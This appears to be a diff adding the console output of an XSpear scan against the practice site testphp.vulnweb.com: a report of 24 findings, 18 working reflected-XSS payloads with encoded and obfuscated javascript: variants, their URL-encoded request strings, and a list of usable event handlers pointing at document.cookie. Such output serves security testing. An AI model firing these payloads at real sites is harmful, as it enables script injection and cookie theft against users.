@@ -1,0 +1,83 @@
+XSpear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 1
+    )  (
+ ( /(  )\ )
+ )\())(()/(          (     )  (
+((_)\  /(_))`  )    ))\ ( /(  )(
+__((_)(_))  /(/(   /((_))(_))(()\
+\ \/ // __|((_)_\ (_)) ((_)_  ((_)
+ >  < \__ \| '_ \)/ -_)/ _` || '_|
+/_/\_\|___/| .__/ \___|\__,_||_|    />
+           |_|                   \ /<
+{\\\\\\\\\\\\\BYHAHWUL\\\\\\\\\\\(0):::<======================-
+                                 / \<
+                                    \>       [ v1.4.1 ]
+[*] analysis request..
+[*] used test-reflected-params mode(default)
+[*] creating a test query [for reflected 2 param ]
+[*] test query generation is complete. [258 query]
+[*] starting XSS Scanning. [10 threads]
+[##########################################################################################################] [258/258] [100.00%] [00:18] [00:00] [ 13.84/s][*] finish scan. the report is being generated..
++----+--------+------------------+--------+-------+------------------------------------------------+----------------------------------------+
+|                                                             [ XSpear report ]                                                             |
+|                                            http://testphp.vulnweb.com/listproducts.php?cat=123                                            |
+|                                  2024-08-29 07:30:02 -0400 ~ 2024-08-29 07:30:23 -0400 Found 24 issues.                                   |
++----+--------+------------------+--------+-------+------------------------------------------------+----------------------------------------+
+| NO | TYPE   | ISSUE            | METHOD | PARAM | PAYLOAD                                        | DESCRIPTION                            |
++----+--------+------------------+--------+-------+------------------------------------------------+----------------------------------------+
+| 0  | INFO   | STATIC ANALYSIS  | GET    | -     | <original query>                               | Found Server: nginx/1.19.0             |
+| 1  | INFO   | STATIC ANALYSIS  | GET    | -     | <original query>                               | Not set HSTS                           |
+| 2  | INFO   | STATIC ANALYSIS  | GET    | -     | <original query>                               | Content-Type: text/html; charset=UTF-8 |
+| 3  | LOW    | STATIC ANALYSIS  | GET    | -     | <original query>                               | Not Set X-Frame-Options                |
+| 4  | MEDIUM | STATIC ANALYSIS  | GET    | -     | <original query>                               | Not Set CSP                            |
+| 5  | INFO   | DYNAMIC ANALYSIS | GET    | cat   | XsPeaR"                                        | Found SQL Error Pattern                |
+| 6  | INFO   | REFLECTED        | GET    | cat   | rEfe6                                          | reflected parameter                    |
+| 7  | INFO   | FILERD RULE      | GET    | cat   | onhwul=64                                      | reflected EH on{any} pattern           |
+| 8  | HIGH   | XSS              | GET    | cat   | <script>alert(45)</script>                     | reflected XSS Code                     |
+| 9  | HIGH   | XSS              | GET    | cat   | <marquee onstart=alert(45)>                    | reflected HTML5 XSS Code               |
+| 10 | HIGH   | XSS              | GET    | cat   | "><iframe/src=JavaScriPt:alert(45)>            | reflected XSS Code                     |
+| 11 | HIGH   | XSS              | GET    | cat   | <audio src onloadstart=alert(45)>              | reflected HTML5 XSS Code               |
+| 12 | HIGH   | XSS              | GET    | cat   | <video/poster/onerror=alert(45)>               | reflected HTML5 XSS Code               |
+| 13 | HIGH   | XSS              | GET    | cat   | <details/open/ontoggle="alert`45`">            | reflected HTML5 XSS Code               |
+| 14 | HIGH   | XSS              | GET    | cat   | <meter onmouseover=alert(45)>0</meter>         | reflected HTML5 XSS Code               |
+| 15 | HIGH   | XSS              | GET    | cat   | <keygen autofocus onfocus=alert(45)>           | reflected onfocus XSS Code             |
+| 16 | HIGH   | XSS              | GET    | cat   | <select autofocus onfocus=alert(45)>           | reflected onfocus XSS Code             |
+| 17 | HIGH   | XSS              | GET    | cat   | <a href="javascript&#x003a;alert(45)">XSS</a>  | reflected XSS Code                     |
+| 18 | HIGH   | XSS              | GET    | cat   | <a href="javascript&colon;alert(45)">XSS</a>   | reflected XSS Code                     |
+| 19 | HIGH   | XSS              | GET    | cat   | <textarea autofocus onfocus=alert(45)>         | reflected onfocus XSS Code             |
+| 20 | HIGH   | XSS              | GET    | cat   | <a href="javascript&#0058;alert(45)">XSS</a>   | reflected XSS Code                     |
+| 21 | HIGH   | XSS              | GET    | cat   | <a href="javascript&#0000058alert(45)">XSS</a> | reflected XSS Code                     |
+| 22 | HIGH   | XSS              | GET    | cat   | <input autofocus onfocus=alert(45)>            | reflected onfocus XSS Code             |
+| 23 | HIGH   | XSS              | GET    | cat   | <a href="&#14; javascript:alert(45)">XSS</a>   | reflected XSS Code                     |
++----+--------+------------------+--------+-------+------------------------------------------------+----------------------------------------+
+< Available Objects >
+[cat] param
+ + Available Special Char: ` ( \ ' ) { ] : [ }   $
+ + Available Event Handler: "onanimationcancel","onactivate","onauxclick","onafterscriptexecute","onafterprint","onafterupdate","onanimationstart","onabort","onbeforeactivate","onbeforecut","onbeforeupdate","onbeforeeditfocus","onbeforepaste","onbeforecopy","onbeforedeactivate","onbeforeprint","onbeforeunload","onbegin","onbeforescriptexecute","onblur","onclick","onbounce","oncopy","oncellchange","oncontrolselect","onchange","oncanplaythrough","oncontextmenu","oncanplay","ondblclick","ondataavailable","ondragdrop","ondeactivate","ondragenter","ondatasetchanged","oncut","ondrag","ondragend","ondatasetcomplete","onend","onfilterchange","onerror","onfocus","ondrop","ondragleave","ondragstart","ondragover","onerrorupdate","onfinish","onfocusin","onkeydown","onkeyup","oninput","oninvalid","onlayoutcomplete","onkeypress","onhashchange","onfocusout","onhelp","onloadend","onloadstart","onmessage","onlosecapture","onmouseenter","onmediaerror","onload","onmousedown","onloadstart","onmediacomplete","onmouseover","onmovestart","onoffline","onmouseleave","onmove","onmoveend","onmousemove","onmouseout","onmousewheel","onmouseup","onplay","onpause","ononline","onplaying","onoutofsync","onpointerleave","onpageshow","onpaste","onpointerdown","onpointerenter","onpointerup","onpropertychange","onpointermove","onreadystatechange","onprogress","onpointerover","onpointerout","onredo","onpopstate","onrepeat","onreset","onresize","onrowinserted","onresizeend","onreverse","onrowexit","onresizestart","onrowsenter","onresume","onrowdelete","onstorage","onselectionchange","onscroll","onsearch","onstop","onselectstart","onselect","onstart","onseek","onsubmit","ontrackchange","ontransitioncancel","ontouchstart","onsyncrestored","ontimeupdate","ontoggle","ontouchend","ontransitionend","ontimeerror","ontouchmove","onwaiting","onwheel","ontransitionrun","onunhandledrejection","onunload","onvolumechange","onpointerrawupdate","onundo","whatthe=\"\"onload","onurlflip"
+ + Available HTML Tag: "object","audio","video","img","embed","iframe","style","script","svg","meta","applet","frameset","frame"
+ + Available Useful Code: "document.cookie","document.location","window.location"
+
+< Raw Query >                                                                                                                                              
+[0] http://testphp.vulnweb.com/listproducts.php?-
+[1] http://testphp.vulnweb.com/listproducts.php?-
+[2] http://testphp.vulnweb.com/listproducts.php?-
+[3] http://testphp.vulnweb.com/listproducts.php?-
+[4] http://testphp.vulnweb.com/listproducts.php?-
+[5] http://testphp.vulnweb.com/listproducts.php?cat=123XsPeaR%22
+[6] http://testphp.vulnweb.com/listproducts.php?cat=123rEfe6
+[7] http://testphp.vulnweb.com/listproducts.php?cat=123%5C%22%3E%3Cxspear+onhwul%3D64%3E
+[8] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E
+[9] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cmarquee+onstart%3Dalert%2845%29%3E
+[10] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Ciframe%2Fsrc%3DJavaScriPt%3Aalert%2845%29%3E
+[11] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Caudio+src+onloadstart%3Dalert%2845%29%3E
+[12] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cvideo%2Fposter%2Fonerror%3Dalert%2845%29%3E
+[13] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cdetails%2Fopen%2Fontoggle%3D%22alert%6045%60%22%3E
+[14] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cmeter+onmouseover%3Dalert%2845%29%3E0%3C%2Fmeter%3E
+[15] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ckeygen+autofocus+onfocus%3Dalert%2845%29%3E
+[16] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cselect+autofocus+onfocus%3Dalert%2845%29%3E
+[17] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ca+href%3D%22javascript%26%23x003a%3Balert%2845%29%22%3EXSS%3C%2Fa%3E
+[18] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ca+href%3D%22javascript%26colon%3Balert%2845%29%22%3EXSS%3C%2Fa%3E
+[19] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ctextarea+autofocus+onfocus%3Dalert%2845%29%3E
+[20] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ca+href%3D%22javascript%26%230058%3Balert%2845%29%22%3EXSS%3C%2Fa%3E
+[21] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ca+href%3D%22javascript%26%230000058alert%2845%29%22%3EXSS%3C%2Fa%3E
+[22] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Cinput+autofocus+onfocus%3Dalert%2845%29%3E
+[23] http://testphp.vulnweb.com/listproducts.php?cat=123%22%27%3E%3Ca+href%3D%22%26%2314%3B+javascript%3Aalert%2845%29%22%3EXSS%3C%2Fa%3E
